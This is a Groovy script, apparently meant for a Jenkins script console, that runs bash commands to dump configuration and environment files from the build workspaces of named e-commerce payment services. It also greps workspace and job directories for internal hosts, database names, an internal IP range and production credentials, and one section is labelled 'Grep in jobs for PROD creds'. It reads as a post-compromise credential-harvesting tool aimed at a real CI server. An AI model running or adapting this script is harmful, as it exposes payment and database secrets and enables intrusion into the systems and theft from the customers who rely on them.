// MICRO-AH: Read active caja-ng config + carritoms + specific T1/dbasears grep
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(5000)
}

println "=== caja-ng ConfigureServiceManager.php (payment config) ==="
def cajaConf = run("cat '/var/jenkins_home/workspace/cs_msa_build_caja-ng/app/ConfigureServiceManager.php' 2>/dev/null | head -100")
println cajaConf.take(3000)

println "\n=== caja-ng find all config/env files ==="
def cajaFiles = run("find /var/jenkins_home/workspace/cs_msa_build_caja-ng -name '*.php' -path '*/config/*' -o -name '.env*' -o -name '*.ini' -o -name 'config.php' -o -name 'db.php' 2>/dev/null | head -20")
println cajaFiles.take(500)

println "\n=== carritoms backend/config/main.php ==="
def carritomain = run("cat '/var/jenkins_home/workspace/claroshop_build_carritoms.dev.claroshop.com/backend/config/main.php' 2>/dev/null | head -80")
println carritomain.take(2000)

println "\n=== carritoms backend/config/main-local.php ==="
def carritoloc = run("ls '/var/jenkins_home/workspace/claroshop_build_carritoms.dev.claroshop.com/backend/config/' 2>/dev/null && cat '/var/jenkins_home/workspace/claroshop_build_carritoms.dev.claroshop.com/backend/config/main-local.php' 2>/dev/null | head -60")
println carritoloc.take(1000)

println "\n=== SPECIFIC GREP: mrc-services, dbasears, 172.27.141, t1pago, apifinca in ALL jenkins dirs ==="
def t1grep = run("grep -r 'mrc-services\\|dbasears\\|172\\.27\\.141\\|apifinca\\|t1pago\\|payment_t1\\|app_t1' /var/jenkins_home/workspace/ 2>/dev/null | grep -v '.pack\\|.idx' | head -30")
println "T1/Sears specific grep: " + t1grep.take(3000)

println "\n=== ApiComercioPedidos/QA/settings.php ==="
def apiComercio = run("cat '/var/jenkins_home/workspace/_trash/name_it/ApiComercioPedidos/QA/settings.php' 2>/dev/null")
println apiComercio.take(2000)

println "\n=== ALSO: Grep in jobs for PROD creds ==="
def jobGrep = run("grep -r 'mrc-services\\|dbasears\\|172\\.27\\.141.*33' /var/jenkins_home/jobs/ 2>/dev/null | grep -v 'Binary\\|.log' | head -20")
println "Jobs grep: " + jobGrep.take(2000)

println "=== DONE MICRO-AH ==="
